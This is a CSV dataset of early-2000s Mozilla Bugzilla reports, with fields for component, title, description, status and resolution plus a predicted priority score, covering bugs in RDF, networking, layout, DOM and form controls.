Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
24216,RDF,XULSortServiceImpl dtor can release this,XULSortServiceImpl::~XULSortServiceImpl does; ;  if (gXULSortService);  {;    nsServiceManager::ReleaseService(kXULSortServiceCID; gXULSortService);;    gXULSortService = nsnull;;  }; ; This assumes that the service manager is actually holding a refeence. In a; simple case where the sm is *not* holding a reference then is can cause the; equiv. of NS_RELEASE(this) when this mRefcnt == 0 and an assertion rightly; follows.; ; ; At minimul; I sugges that you change the conditional to:;  if (gXULSortService && gXULSortService != this); ; But Im unclear how this gRefCnt can go to 0 if the service manager *does* still; hold a reference?; ; Im running code in xpcshell to create and release this progid and see the; failure. Does apprunner every actually call this code in the dtor?; ; in xpcshell one can run:; ; var name = component://netscape/rdf/xul-sort-service;; ; try {;     var foo = Components.classes[name].createInstance();;     print(foo);;     foo = null;;     gc();; } catch(e) {;     print(caught+e);; },VERIFIED,FIXED,[TITLE] Title: XULSortServiceImpl dtor can release this | [DESC] Description: XULSortServiceImpl::~XULSortServiceImpl does; ;  if (gXULSortService);  {;    nsServiceManager::ReleaseService(kXULSortServiceCID; gXULSortService);;    gXULSortService = nsnull;;  }; ; This assumes that the service manager is actually holding a refeence. In a; simple case where the sm is *not* holding a reference then is can cause the; equiv. of NS_RELEASE(this) when this mRefcnt == 0 and an assertion rightly; follows.; ; ; At minimul; I sugges that you change the conditional to:;  if (gXULSortService && gXULSortService != this); ; But Im unclear how this gRefCnt can go to 0 if the service manager *does* still; hold a reference?; ; Im running code in xpcshell to create and release this progid and see the; failure. Does apprunner every actually call this code in the dtor?; ; in xpcshell one can run:; ; var name = component://netscape/rdf/xul-sort-service;; ; try {;     var foo = Components.classes[name].createInstance();;     print(foo);;     foo = null;;     gc();; } catch(e) {;     print(caught+e);; } | [META] Component: RDF | [META] Status: VERIFIED | [META] Resolution: FIXED,2
44334,Layout: HTML Frames,Images not loading when accessing Security Focus,From Bugzilla Helper:; User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt); BuildID:    2000101014; ; When I go to the site www.securityfocus.com The layout with the different ; sections never loads up or it loads and disappears into the background. The ; link areas are still valid but the graphics do not load there. If you attempt a ; reload it may cause random layout problems still once in a while. I am not sure ; if this is because of the <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 ; Frameset//EN;      http://www.w3.org/TR/REC-html40/frameset.dtd> ; or not. I have to use IE to view the page correctly or otherwise id use ; Mozilla M18 for it.; ; Thanks; ; Reproducible: Always; Steps to Reproduce:; 1.type in http://www.securityfocus.com; 2.Wait for the page to load; 3.Try reloading to fix; ; Actual Results:  The navigation tab bar still does not show up or load. After ; trying another reload the page comes out weird.; ; Expected Results:  Mozilla should show the navigation bar correctly and after a ; reload should have consistant rendering.; ; This page uses frame sets and the DOCTYPE tag is; <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 Frameset//EN;      http://www.w3.org/TR/REC-html40/frameset.dtd>,RESOLVED,WORKSFORME,[TITLE] Title: Images not loading when accessing Security Focus | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt); BuildID:    2000101014; ; When I go to the site www.securityfocus.com The layout with the different ; sections never loads up or it loads and disappears into the background. The ; link areas are still valid but the graphics do not load there. If you attempt a ; reload it may cause random layout problems still once in a while. I am not sure ; if this is because of the <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 ; Frameset//EN;      http://www.w3.org/TR/REC-html40/frameset.dtd> ; or not. I have to use IE to view the page correctly or otherwise id use ; Mozilla M18 for it.; ; Thanks; ; Reproducible: Always; Steps to Reproduce:; 1.type in http://www.securityfocus.com; 2.Wait for the page to load; 3.Try reloading to fix; ; Actual Results:  The navigation tab bar still does not show up or load. After ; trying another reload the page comes out weird.; ; Expected Results:  Mozilla should show the navigation bar correctly and after a ; reload should have consistant rendering.; ; This page uses frame sets and the DOCTYPE tag is; <!DOCTYPE HTML PUBLIC -//W3C//DTD HTML 4.0 Frameset//EN;      http://www.w3.org/TR/REC-html40/frameset.dtd> | [META] Component: Layout: HTML Frames | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,1
45644,Networking,Mozilla does not exit correctly while loading finger: url,If I exit Mozilla while loading finger:15.15.15.15; Mozilla never completely ; exits.  Im using -console; so that means the console window stays up.  I have ; to force-quit before I can start Mozilla again because of bug 50424.; ; The first time this happened; most of Win98 froze and I had to ctrl-alt-del ; Mozilla to unfreeze everything; but usually I can kill it by just clicking ; the x in the console window.  (This only works if Im using the -console ; command-line option; of course.); ; This seems to only happen if the *last* Mozilla window closed was loading the ; finger url.,VERIFIED,WORKSFORME,[TITLE] Title: Mozilla does not exit correctly while loading finger: url | [DESC] Description: If I exit Mozilla while loading finger:15.15.15.15; Mozilla never completely ; exits.  Im using -console; so that means the console window stays up.  I have ; to force-quit before I can start Mozilla again because of bug 50424.; ; The first time this happened; most of Win98 froze and I had to ctrl-alt-del ; Mozilla to unfreeze everything; but usually I can kill it by just clicking ; the x in the console window.  (This only works if Im using the -console ; command-line option; of course.); ; This seems to only happen if the *last* Mozilla window closed was loading the ; finger url. | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
26615,XUL,[dogfood] mousing over checkboxes in prefs reflows window,launch apprunner with paint flashing on.; open prefs window.; mouse over any checkbox; see the whole panel reflow/repaint.,VERIFIED,FIXED,[TITLE] Title: [dogfood] mousing over checkboxes in prefs reflows window | [DESC] Description: launch apprunner with paint flashing on.; open prefs window.; mouse over any checkbox; see the whole panel reflow/repaint. | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: FIXED,2
42688,DOM,Element.setAttributeNode() returns null instead of Attr obj reference,While the setAttributeNode() method appears to do its primary job; the method is; supposed to return a reference to the newly added Attr node. As of M17; the; method returns null.,RESOLVED,WORKSFORME,[TITLE] Title: Element.setAttributeNode() returns null instead of Attr obj reference | [DESC] Description: While the setAttributeNode() method appears to do its primary job; the method is; supposed to return a reference to the newly added Attr node. As of M17; the; method returns null. | [META] Component: DOM | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,3
45341,Networking,Netscape 6 failed to open document when target is set,Consider the following html:; ; <html>; <body>; <a href=<some valid Excel/Word document> target=My Attachment>my; Attachment</a>; <br>; <a href=http://cnn.com target=My Attachment>cnn.com</a>; </body>; </html>; ; The second link opens a separate browser with cnn.com loaded (which I think is; correct behavior).  However; the first link fails to open the document.,RESOLVED,WORKSFORME,[TITLE] Title: Netscape 6 failed to open document when target is set | [DESC] Description: Consider the following html:; ; <html>; <body>; <a href=<some valid Excel/Word document> target=My Attachment>my; Attachment</a>; <br>; <a href=http://cnn.com target=My Attachment>cnn.com</a>; </body>; </html>; ; The second link opens a separate browser with cnn.com loaded (which I think is; correct behavior).  However; the first link fails to open the document. | [META] Component: Networking | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,2
31723,Networking,jar file cache should open local files in place,The JAR file cache is trying to download local files (referred to through the ; resource URL).  It should simply open them in place.,VERIFIED,FIXED,[TITLE] Title: jar file cache should open local files in place | [DESC] Description: The JAR file cache is trying to download local files (referred to through the ; resource URL).  It should simply open them in place. | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: FIXED,2
37264,Layout: Form Controls,Textarea wont show using a strict DTD and ENABLE_STRICT=true,Attached simple HTML displays no textfield using a 30/5 nightly build.; ; Running Mozilla without ENABLE_STRICT=true displays the textfield; as expected.,VERIFIED,FIXED,[TITLE] Title: Textarea wont show using a strict DTD and ENABLE_STRICT=true | [DESC] Description: Attached simple HTML displays no textfield using a 30/5 nightly build.; ; Running Mozilla without ENABLE_STRICT=true displays the textfield; as expected. | [META] Component: Layout: Form Controls | [META] Status: VERIFIED | [META] Resolution: FIXED,2
49781,Layout,Caret turd when setting designMode on about:blank page,To reproduce:; - Open a new tab (which is empty); - Type (copy) this javascript in the url bar: javascript:document.designMode=on; void 0; ; Expected result:; Document is editable; caret is visible; ; Actual result:; Document is editable; caret is visible; but above the caret; I see a caret turd.; ; I can see this bug; using a 2006-04-28 trunk build.; I think its a regression from bug 287813.,VERIFIED,FIXED,[TITLE] Title: Caret turd when setting designMode on about:blank page | [DESC] Description: To reproduce:; - Open a new tab (which is empty); - Type (copy) this javascript in the url bar: javascript:document.designMode=on; void 0; ; Expected result:; Document is editable; caret is visible; ; Actual result:; Document is editable; caret is visible; but above the caret; I see a caret turd.; ; I can see this bug; using a 2006-04-28 trunk build.; I think its a regression from bug 287813. | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: FIXED,1
34145,Layout: Form Controls,INPUT TYPE=FILE segfaults Mozilla when file selected,From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; N; Linux 2.2.12 i586; en-US; m14); BuildID:    2000032909; ; When a file is selected from an <INPUT TYPE=FILE> tag; the browser crashes in Linux.; ; Reproducible: Always; Steps to Reproduce:; 1.Open the test case Im including. Browse to a file and select it.; 2.; 3.; ; Actual Results:  The browser segfaults 	; ; Expected Results:  no crashing. The control should revert back to the HTML page,VERIFIED,FIXED,[TITLE] Title: INPUT TYPE=FILE segfaults Mozilla when file selected | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; N; Linux 2.2.12 i586; en-US; m14); BuildID:    2000032909; ; When a file is selected from an <INPUT TYPE=FILE> tag; the browser crashes in Linux.; ; Reproducible: Always; Steps to Reproduce:; 1.Open the test case Im including. Browse to a file and select it.; 2.; 3.; ; Actual Results:  The browser segfaults 	; ; Expected Results:  no crashing. The control should revert back to the HTML page | [META] Component: Layout: Form Controls | [META] Status: VERIFIED | [META] Resolution: FIXED,2
22096,Networking,Assertion failure: !I/O method is invalid; at priometh.c:86,Current Build (05-31-99) dies on startup with this messages when not connected; to the internet. When connected all works well.; ; Doing Startup...; Creating browser app core; BrowserAppCore has been created.; Adding app core to AppCoreManager in the base initialization.; Setting content window; Assertion failure: !I/O method is invalid; at priometh.c:86; Aborted; ; Seems similar to bug 7387,VERIFIED,FIXED,[TITLE] Title: Assertion failure: !I/O method is invalid; at priometh.c:86 | [DESC] Description: Current Build (05-31-99) dies on startup with this messages when not connected; to the internet. When connected all works well.; ; Doing Startup...; Creating browser app core; BrowserAppCore has been created.; Adding app core to AppCoreManager in the base initialization.; Setting content window; Assertion failure: !I/O method is invalid; at priometh.c:86; Aborted; ; Seems similar to bug 7387 | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: FIXED,0
